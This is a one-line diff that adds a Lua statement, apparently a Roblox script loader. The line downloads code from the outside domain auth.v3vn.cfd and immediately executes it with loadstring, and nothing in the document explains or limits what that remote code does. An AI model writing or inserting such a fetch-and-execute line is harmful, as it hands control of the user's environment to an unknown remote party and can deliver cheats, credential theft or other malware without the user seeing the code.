@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://auth.v3vn.cfd/loader.lua"))()
